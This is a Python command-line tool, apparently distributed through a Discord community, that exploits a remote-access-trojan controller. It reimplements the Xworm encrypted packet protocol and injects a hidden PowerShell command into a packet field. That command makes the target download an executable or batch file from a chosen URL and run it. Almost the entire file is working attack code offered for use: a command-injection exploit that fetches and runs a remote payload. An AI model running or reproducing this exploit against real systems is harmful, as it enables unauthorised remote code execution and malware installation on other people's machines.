import socket
import io
import time
import random
import string
import hashlib
import os
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad
from colorama import Fore, init
import platform
import sys

init()  # Initialize colorama

def clear_screen():
    os.system("cls") if platform.system() == "Windows" else os.system("clear")

class Packet:
    def __init__(self, *data: list[bytes]):
        self.data = data

    def write_bytes(self, into):
        into.write(b'<Xwormmm>'.join(self.data))
    
    def get_bytes(self):
        b = io.BytesIO()
        self.write_bytes(b)
        return b.getbuffer().tobytes()

def genid(length=8):
    return ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def sendpacket(sock, packet, key):
    try:
        key_hash = hashlib.md5(key.encode('utf-8')).digest()
        crypto = AES.new(key_hash, AES.MODE_ECB)
        data = packet.get_bytes()
        encrypted = crypto.encrypt(pad(data, 16))
        sock.send(str(len(encrypted)).encode('utf-8') + b'\0')
        sock.send(encrypted)
        return encrypted
    except Exception as e:
        print(Fore.GREEN + f"[!] Encryption/transmission error: {str(e)}" + Fore.RESET)
        return None

def rce(host, port, key, file_url):
    client_id = genid()

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(10)
        
        try:
            print(Fore.GREEN + f"\n[*] Connecting to {host}:{port}..." + Fore.RESET)
            sock.connect((host, port))
            print(Fore.GREEN + f"[+] Target {host}:{port} is online!" + Fore.RESET)
        except socket.timeout:
            print(Fore.GREEN + "[!] Target is offline (connection timeout)" + Fore.RESET)
            return False
        except ConnectionRefusedError:
            print(Fore.GREEN + "[!] Target is offline (connection refused)" + Fore.RESET)
            return False
        except Exception as e:
            print(Fore.GREEN + f"[!] Connection error: {str(e)}" + Fore.RESET)
            return False

        handshake_packet = Packet(b'hrdp', client_id.encode('utf-8'))
        if not sendpacket(sock, handshake_packet, key):
            return False
        
        time.sleep(0.5)
        
        file_extension = '.bat' if file_url.lower().endswith('.bat') else '.exe'
        random_filename = f"{genid(5)}{file_extension}"
        
        print(Fore.GREEN + f"[*] Downloading payload from: {file_url}" + Fore.RESET)
        
        if file_extension == '.bat':
            ps_command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{file_url}\\\"; $outputPath = \\\"$env:TEMP\\\\{random_filename}\\\"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Process -FilePath 'cmd.exe' -ArgumentList '/c', $outputPath"
        else:
            ps_command = f"start powershell.exe -WindowStyle Hidden $url = \\\"{file_url}\\\"; $outputPath = \\\"$env:TEMP\\\\{random_filename}\\\"; Invoke-WebRequest -Uri $url -OutFile $outputPath; Start-Sleep -s 3; cmd.exe /c start \"\" $outputPath"
        
        exploit_packet = Packet(
            b'hrdp+', 
            client_id.encode('utf-8'), 
            b" lol", 
            f"\" & {ps_command}".encode('utf-8'),
            b"1:1"
        )
        
        if not sendpacket(sock, exploit_packet, key):
            return False
            
        print(Fore.GREEN + f"[+] Payload sent successfully to target!" + Fore.RESET)
        return True
        
    except Exception as e:
        print(Fore.GREEN + f"[!] Unexpected error: {str(e)}" + Fore.RESET)
        return False
    finally:
        try:
            sock.close()
        except:
            pass

def get_connection_details():
    print(Fore.GREEN + "[*] Please enter connection details:" + Fore.RESET)
    host = input(Fore.GREEN + "[*] Enter IP-Address/Hostname. Example: ( 127.0.0.1 ): " + Fore.RESET)
    port = input(Fore.GREEN + "[*] Enter Port Example: ( 9090 ): " + Fore.RESET)
    
    try:
        port = int(port)
    except ValueError:
        print(Fore.GREEN + "[!] Invalid port number" + Fore.RESET)
        time.sleep(2)
        return None, None, None, None
    
    key = input(Fore.GREEN + "[*] Encryption key default: ( <123456789> ): " + Fore.RESET) or "<123456789>"
    file_url = input(Fore.GREEN + "[*] Payload URL to download. Example: ( https://example.com/file.exe ): " + Fore.RESET)
    
    return host, port, key, file_url

def show_banner():
    print(
        Fore.GREEN +
        """
██████  ██    ██     ███    ██  █████  ███    ██  █████  ██ 
██   ██  ██  ██      ████   ██ ██   ██ ████   ██ ██   ██ ██ 
██████    ████       ██ ██  ██ ███████ ██ ██  ██ ███████ ██ 
██   ██    ██        ██  ██ ██ ██   ██ ██  ██ ██ ██   ██ ██ 
██████     ██        ██   ████ ██   ██ ██   ████ ██   ██ ██ 
                                                            
                                                            
[@] https://discord.gg/uPJ4BmhSEa
                                                                        
"""
    )

def main():
    while True:
        clear_screen()
        show_banner()
        
        host, port, key, file_url = get_connection_details()
        if None in (host, port, key, file_url):
            continue
            
        print(Fore.GREEN + f"\n[?] Attempting to connect to {host}:{port}" + Fore.RESET)
        print(Fore.GREEN + f"[?] Using encryption key: {key}" + Fore.RESET)
        print(Fore.GREEN + f"[?] Payload URL: {file_url}" + Fore.RESET)
        
        if rce(host, port, key, file_url):
            print(Fore.GREEN + "[+] Execution completed successfully" + Fore.RESET)
            input(Fore.GREEN + "\nPress Enter to exit..." + Fore.RESET)
            break
        else:
            print(Fore.GREEN + "[!] Operation failed (target may be offline or credentials incorrect)" + Fore.RESET)
            retry = input(Fore.GREEN + "\nPress Enter to try again or type 'exit' to quit: " + Fore.RESET)
            if retry.lower() == 'exit':
                break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(Fore.GREEN + "\n[!] Operation cancelled by user" + Fore.RESET)
        sys.exit(0)
    except Exception as e:
        print(Fore.GREEN + f"[!] Critical error: {str(e)}" + Fore.RESET)
        sys.exit(1)
